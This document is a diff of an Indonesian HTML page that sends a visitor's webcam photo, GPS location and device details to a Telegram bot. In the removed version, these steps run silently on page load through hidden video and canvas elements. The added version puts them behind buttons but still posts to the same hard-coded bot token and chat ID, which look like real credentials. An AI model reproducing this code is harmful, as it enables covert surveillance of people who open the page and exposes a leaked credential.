@@ -1,96 +1,107 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CONTOH SCRIPT BY OKA</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script>
-    $(document).ready(function() {
-      // Fungsi untuk mengambil foto
-      function takePhoto() {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(function(stream) {
-            var video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-
-            // Mengambil foto setelah 2 detik
-            setTimeout(function() {
-              var canvas = document.getElementById('canvas');
-              var context = canvas.getContext('2d');
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
-              
-              // Mengirim foto ke Telegram API
-              sendPhotoToTelegramAPI(canvas.toDataURL('image/jpeg'));
-              
-              // Menghentikan akses kamera
-              stream.getTracks().forEach(function(track) {
-                track.stop();
-              });
-            }, 2000);
-          })
-          .catch(function(error) {
-            console.log('Gagal mengakses kamera: ' + error.message);
-          });
-      }
-
-      // Fungsi untuk mengklik elemen
-      function clickElement() {
-        var element = document.getElementById('targetElement');
-        element.click();
-      }
-
-      // Fungsi untuk mendapatkan lokasi menggunakan GPS
-      function getLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(showPosition);
-        } else {
-          console.log("Browser tidak mendukung geolocation.");
+    <title>Bot Telegram</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
         }
-      }
 
-      // Fungsi untuk menampilkan informasi lokasi dan perangkat
-      function showPosition(position) {
-        var latitude = position.coords.latitude;
-        var longitude = position.coords.longitude;
-        var userAgent = navigator.userAgent;
-        var deviceInfo = "Perangkat: " + navigator.platform + ", Browser: " + userAgent;
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
 
-        // Mengirim data lokasi dan informasi perangkat ke Telegram API
-        sendToTelegramAPI(latitude, longitude, deviceInfo);
-      }
+            // Kirim data lokasi ke Telegram HTTP API
+            $.post(
+                "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendLocation",
+                {
+                    chat_id: "<YOUR_CHAT_ID>",
+                    latitude: latitude,
+                    longitude: longitude
+                },
+                function (data, status) {
+                    if (status === "success") {
+                        alert("Lokasi berhasil dikirim ke Telegram.");
+                    } else {
+                        alert("Gagal mengirim lokasi ke Telegram.");
+                    }
+                }
+            );
+        }
 
-      // Fungsi untuk mengirim foto ke Telegram API
-      function sendPhotoToTelegramAPI(photo) {
-        var apiKey = 'YOUR_API_KEY';
-        var chatId = 'CHAT_ID'; // Ganti dengan ID chat yang sesuai
+        function takePhoto() {
+            var video = document.querySelector("#videoElement");
 
-        // Mengirim data foto ke Telegram API menggunakan metode POST
-        $.post("https://api.telegram.org/bot" + apiKey + "/sendPhoto?chat_id=" + chatId + "&photo=" + photo);
-      }
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
+                    video.srcObject = stream;
+                    video.play();
 
-      // Fungsi untuk mengirim data ke Telegram API
-      function sendToTelegramAPI(latitude, longitude, deviceInfo) {
-        var apiKey = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-        var chatId = '1121369247'; // Ganti dengan ID chat yang sesuai
+                    // Ambil gambar dari video
+                    setTimeout(function () {
+                        var canvas = document.createElement("canvas");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var image = canvas.toDataURL("image/jpeg");
 
-        var message = "Lokasi: " + latitude + ", " + longitude + "\n" +
-                      "Informasi Perangkat: " + deviceInfo;
+                        // Kirim foto ke Telegram HTTP API
+                        $.post(
+                            "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendPhoto",
+                            {
+                                chat_id: "<1121369247>",
+                                photo: image
+                            },
+                            function (data, status) {
+                                if (status === "success") {
+                                    alert("Foto berhasil dikirim ke Telegram.");
+                                } else {
+                                    alert("Gagal mengirim foto ke Telegram.");
+                                }
+                            }
+                        );
 
-        // Mengirim data ke Telegram API menggunakan metode POST
-        $.post("https://api.telegram.org/bot" + apiKey + "/sendMessage?chat_id=" + chatId + "&text=" + message);
-      }
+                        video.srcObject.getVideoTracks().forEach(function (track) {
+                            track.stop();
+                        });
+                    }, 2000);
+                });
+            } else {
+                alert("Browser tidak mendukung pengambilan foto.");
+            }
+        }
 
-      // Panggil fungsi-fungsi yang diperlukan
-      takePhoto();
-      clickElement();
-      getLocation();
-    });
-  </script>
+        function sendDeviceInfo() {
+            var deviceInfo = "Browser: " + navigator.userAgent;
+
+            // Kirim informasi perangkat ke Telegram HTTP API
+            $.post(
+                "https://api.telegram.org/bot<6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ>/sendMessage",
+                {
+                    chat_id: "<1121369247>",
+                    text: deviceInfo
+                },
+                function (data, status) {
+                    if (status === "success") {
+                        alert("Informasi perangkat berhasil dikirim ke Telegram.");
+                    } else {
+                        alert("Gagal mengirim informasi perangkat ke Telegram.");
+                    }
+                }
+            );
+        }
+    </script>
 </head>
 <body>
-  <h1>Contoh Script HTML untuk Mengambil Foto, Lokasi, dan Informasi Perangkat</h1>
-  <video id="video" style="display: none;"></video>
-  <canvas id="canvas" style="display: none;"></canvas>
-  <button id="targetElement" style="display: none;"></button>
+    <h1>Bot Telegram</h1>
+    <button onclick="getLocation()">Kirim Lokasi</button>
+    <button onclick="takePhoto()">Ambil Foto</button>
+    <button onclick="sendDeviceInfo()">Kirim Informasi Perangkat</button>
+    <video id="videoElement" style="display: none;"></video>
 </body>
 </html>
